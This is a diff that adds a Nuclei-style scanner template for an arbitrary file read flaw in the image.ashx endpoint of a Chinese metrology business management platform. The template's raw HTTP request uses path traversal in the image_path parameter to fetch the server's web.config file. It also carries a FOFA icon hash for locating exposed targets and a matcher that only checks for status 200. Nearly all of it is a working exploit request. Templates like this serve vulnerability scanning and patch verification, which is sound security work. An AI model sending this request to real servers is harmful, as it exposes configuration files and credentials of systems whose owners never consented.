@@ -1,0 +1,27 @@
+id: poc-tgeo9qxlwhx21mz7
+info:
+  name: 卓软计量业务管理平台 image.ashx 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tgeo9qxlwhx21mz7'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tgeo9qxlwhx21mz7
+    fofa: icon_hash="-334571363"
+http:
+- raw:
+  - 'GET /HuameiMeasure/image.ashx?image_path=./../web.config HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
